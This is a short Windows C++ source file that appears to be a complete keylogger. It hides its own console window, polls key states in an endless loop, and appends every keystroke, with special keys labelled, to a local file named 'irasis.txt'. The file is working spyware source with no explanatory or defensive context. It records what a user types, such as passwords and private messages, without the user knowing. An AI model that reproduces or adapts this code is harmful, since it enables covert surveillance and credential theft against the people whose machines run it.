#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>
#include <memory.h>
#define LOG_FILE "irasis.txt"
void Stealth()
{
 HWND Stealth;
 AllocConsole();
 Stealth = FindWindowA("ConsoleWindowClass", NULL);
 ShowWindow(Stealth,0);
}
void saveData(std::string data) 
{
    std::fstream logFile;
    logFile.open(LOG_FILE, std::ios::app);
    logFile << data;
    logFile.close();
}
std::string translateSpecialKey(int key)
{
    std::string result;
    switch (key)
    {
    case VK_SPACE:
        result = " ";
        break;
    case VK_RETURN:
        result = "\n";
        break;
    case VK_BACK:
        result = "[BACKSPACE]";
        break;
    case VK_CAPITAL:
        result = "[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        result = "[SHIFT]";
        break;
    case VK_TAB:
        result = "[TAB]";
        break;
    case VK_CONTROL:
        result = "[CTRL]";
        break;
    case VK_MENU:
        result = "[ALT]";
        break;
    default:
        break;
    }
    return result;
}
int main()
{
    int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_BACK, VK_CAPITAL, VK_SHIFT, VK_TAB, VK_CONTROL, VK_MENU};
    std::string specialKeyChar;
    bool isSpecialKey;
    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray)
                , key) != std::end(specialKeyArray);
                if (isSpecialKey) {
                    specialKeyChar = translateSpecialKey(key);
                    saveData(specialKeyChar);
                } 
                else {
                    if (GetKeyState(VK_CAPITAL)) {
                        saveData(std::string(1, (char)key));
                    }
                    else {
                        saveData(std::string(1, (char)std::tolower(key)));
                    }
                }
            }
        }
    }
    
    return 0;
}